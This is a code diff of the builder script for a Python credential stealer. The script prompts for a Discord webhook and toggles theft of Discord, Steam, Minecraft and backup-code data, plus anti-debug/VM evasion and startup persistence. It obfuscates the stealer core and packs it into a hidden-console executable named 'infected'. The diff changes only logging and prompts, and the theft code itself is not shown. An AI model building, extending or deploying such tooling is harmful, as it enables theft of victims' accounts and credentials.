@@ -24,7 +24,7 @@ from utils.module.Obfuscators import Obfuscators # Restored because obfscator wa
 from utils.module.logger import log_debug, timestamp, log_warn, log_error
 
 os.system("cls")
-obf = Obfuscators(include_imports=True, recursion=5)
+obf = Obfuscators(include_imports=True, recursion=3)
 
 version = "v1.32.2"
 CONFIG_KEYS = ["Anti_Debugs_VM", "discord", "backupcode", "system", "minecraft", "Steam", "startup"]
@@ -57,8 +57,9 @@ def ask_toggle(key):
                 print(f"{Fore.CYAN}\b\b No")
                 return False
             else:
-                print(f"\n{Fore.RED}Invalid Option. Retry please")
-                print(timestamp() + f"{Fore.LIGHTMAGENTA_EX}? {Fore.RESET}Enable {key}:{Fore.CYAN} ", end="", flush=True)
+                log_warn("Invalid")
+                print (" ")
+                print(timestamp() + f"{Fore.LIGHTMAGENTA_EX}* {Fore.RESET}Enable {key}:{Fore.CYAN} ", end="", flush=True)
 
 
 def ask_webhook():
@@ -68,14 +69,14 @@ def ask_webhook():
         if webhook_pattern.match(val):
             return val
         else:
-            log_debug("Invalid Webhook URL provided.")
+            log_warn("Invalid Webhook.")
 
 def update_config_in_file(filepath, updated_config, webhook_url=None):
     try:
         with open(filepath, "r", encoding="utf-8") as f:
             content = f.read()
     except Exception as e:
-        log_debug(f"Error reading file {filepath}: {e}")
+        log_error(f"Reading file {filepath}: {e}")
 
     try:
         for key, value in updated_config.items():
@@ -86,7 +87,7 @@ def update_config_in_file(filepath, updated_config, webhook_url=None):
             f.write(content)
         log_debug(f"Config Save Successfully.")
     except Exception as e:
-        log_debug(f"Error updating config in {filepath}: {e}")
+        log_error(f"Error updating config in {filepath}: {e}")
         sys.exit(1)
 
 
@@ -104,13 +105,13 @@ def build():
 
     subprocess.run(["pyinstaller", "--version"], shell=True)
     subprocess.run(["pyinstaller", "--help"], shell=True)
-    print(f"{Fore.LIGHTBLUE_EX}[Pyinstaller]{Fore.RESET} Start Build Process")
+    log_debug("Started Build with Pyinstaller")
     subprocess.run([
         "pyinstaller", "--onefile", "--clean", "--noconsole",
         "--name=infected", "--icon=src/ico.ico", "--upx-dir=src/upx",
         "src/stealer_core/src.py"
     ], shell=True)
-    print(f"{Fore.LIGHTBLUE_EX}[Pyinstaller]{Fore.RESET} Build Finished.")
+    log_debug("Build Finished.")
     notification.notify(
     title='Build Completed.',
     message='The build is complete, please check the dist.',
